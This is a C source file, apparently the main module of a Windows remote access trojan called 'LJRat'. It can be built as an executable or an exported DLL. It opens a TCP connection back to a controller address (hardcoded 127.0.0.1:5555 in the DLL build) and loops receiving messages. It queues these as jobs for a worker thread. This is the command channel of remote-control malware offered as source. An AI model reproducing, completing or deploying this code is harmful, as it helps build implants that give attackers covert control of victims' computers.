#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <Windows.h>
#include <process.h>
#include "LJRat.h"
#include "error_code.h"
#include "session.h"
#include "debug.h"
#include "message.h"
#include "list.h"
#include "worker.h"

#define SHUTDOWN_INITIATED 1

SESSION_CTX session_ctx;

#ifndef BUILD_DLL
#define EXPORT_FUNC

INT main(INT argc, CHAR *argv[])
{
    Run(argc, argv);
}

#else

#define EXPORT_FUNC __declspec(dllexport)
#define TARGET_PORT 5555
#define TARGET_IP "127.0.0.1"

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}

#endif // BUILD_DLL

#ifndef BUILD_DLL
EXPORT_FUNC ERROR_T Run(INT argc, CHAR *argv[])
#else
EXPORT_FUNC ERROR_T Run(VOID)
#endif // BUILD_DLL
{
    INT iError = E_SUCCESS;
    INT iStartup = E_SUCCESS;
    WSADATA wData;
    SOCKET sock;
    DWORD dwPort = 0;
    INT iSelectRet = 0;
    SOCKADDR_IN addr = {0};
    fd_set read_fds = {0};
    TIMEVAL timeout = {0};
    PMESSAGE pMsg = NULL;
    PLIST_ITEM pTemp = NULL;
    HANDLE hThread = INVALID_HANDLE_VALUE;
    DWORD dwThreadId;

    session_ctx.gShutdown = 0;
    SRWListInitialize(&session_ctx.job_list);
    SRWListInitialize(&session_ctx.send_list);
    session_ctx.hJobWait = CreateEventA(NULL, FALSE, FALSE, NULL);

    hThread = (HANDLE) _beginthreadex(NULL, 0, WorkerThread, NULL, 0, &dwThreadId);
    if (0 == hThread)
    {
        iError = E_THREAD_ERROR;
        goto end;
    }

    iStartup = WSAStartup(MAKEWORD(2,2), &wData);
    if (E_SUCCESS != iStartup)
    {
        iError =  E_WINSOCK_ERROR;
        goto end;
    }

    addr.sin_family = AF_INET;

    #ifndef BUILD_DLL
    dwPort = atoi(argv[2]);

    if (dwPort < 1 || dwPort > 65535)
    {
        goto end;
    }

    dwPort = htons(dwPort);
    addr.sin_port = (WORD)dwPort;
    addr.sin_addr.s_addr = inet_addr(argv[1]);

    #else
    addr.sin_port = htons(TARGET_PORT);
    addr.sin_addr.s_addr = inet_addr(TARGET_IP);
    #endif // BUILD_DLL

    if (INADDR_NONE == addr.sin_addr.s_addr)
    {
        goto end;
    }
    iError = SessionInit(&session_ctx, AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (E_SUCCESS != iError) {
        goto end;
    }

    // TODO implement retry behavior
    iError = SessionConnect(&session_ctx, &addr);

    if (E_SUCCESS != iError)
    {
        session_ctx.gShutdown = SHUTDOWN_INITIATED;
    }

    // Set Select timeout to 1 second so we can check for shutdown condition.
    timeout.tv_sec = 1;

    while (SHUTDOWN_INITIATED != session_ctx.gShutdown)
        {
            FD_ZERO(&read_fds);
            FD_SET(session_ctx.sock, &read_fds);
            iError = select(0, &read_fds, NULL, NULL, &timeout);

            switch (iError) {
                case 0:
                    //DBG_PRINT("Timeout\n");
                    break;
                case 1:
                    iError = MessageReceive(session_ctx.sock, &pMsg);
                    if (ERROR_SUCCESS != iError) {
                        //DBG_PRINT("Error reading msg\n");
                        break;
                    }

                    pTemp = ListItemCreate((PVOID) pMsg);
                    SRWListAddTail(&session_ctx.job_list, &pTemp->link);
                    SetEvent(session_ctx.hJobWait);
                    
                    break;
                default:
                    DBG_PRINT("Error %d\n", WSAGetLastError());
                    ;
            }

        }

    DBG_PRINT("SHUTTING DOWN\n");

    end:
    if (0 == iStartup)
    {
        WSACleanup();
    }

    return iError;
}